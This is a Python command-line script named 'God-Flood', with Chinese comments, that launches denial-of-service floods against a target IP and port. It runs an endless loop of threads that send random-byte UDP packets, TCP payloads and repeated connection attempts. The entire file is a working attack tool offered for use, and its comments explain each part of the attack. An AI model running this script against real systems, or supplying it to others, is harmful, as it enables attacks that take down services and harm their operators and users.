#!/usr/bin/env python
# God-Flood(tcp,syn,udp) by LiGhT
import threading
import sys
import random
import socket

# 检查命令行参数数量是否正确
if len(sys.argv) < 4:
    print("God-Flood By LiGhT")
    sys.exit("Usage: python " + sys.argv[0] + " <ip> <port> <size>")

ip = sys.argv[1]  # 目标IP地址
port = int(sys.argv[2])  # 目标端口号
size = int(sys.argv[3])  # UDP数据包的大小
packets = int(sys.argv[3])  # 要发送的数据包数量（这里重复定义了size作为packets）


# 定义SYN洪水攻击线程类
class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()  # 创建TCP套接字
        threading.Thread.__init__(self)

    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))  # 尝试建立TCP连接
            except Exception:
                pass  # 忽略任何异常


# 定义TCP洪水攻击线程类
class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        # 创建TCP套接字
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        threading.Thread.__init__(self)

    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)  # 生成随机大小的数据包
                self.tcp.connect((self.ip, self.port))  # 尝试建立TCP连接
                self.tcp.sendall(bytes)  # 发送数据包
            except Exception:
                pass  # 忽略任何异常


# 定义UDP洪水攻击线程类
class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # 创建UDP套接字
        threading.Thread.__init__(self)

    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)  # 生成随机大小的数据包
                if self.port == 0:
                    self.port = random.randrange(
                        1, 65535
                    )  # 如果端口号为0，则随机选择一个端口
                self.udp.sendto(bytes, (self.ip, self.port))  # 发送数据包
            except Exception:
                pass  # 忽略任何异常


# 主循环
while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")  # 如果数据包大小不合理，则退出
        u = udp(ip, port, size, packets)  # 创建UDP线程实例
        t = tcp(ip, port, size, packets)  # 创建TCP线程实例
        s = syn(ip, port, packets)  # 创建SYN线程实例
        u.start()  # 启动UDP线程
        t.start()  # 启动TCP线程
        s.start()  # 启动SYN线程
    except KeyboardInterrupt:
        print("Stopping Flood!")  # 如果用户中断，则停止攻击
        sys.exit()
    except socket.error as msg:
        print(
            "Socket Couldn't Connect %s", msg
        )  # 如果套接字无法连接，则打印错误消息并退出
        sys.exit()
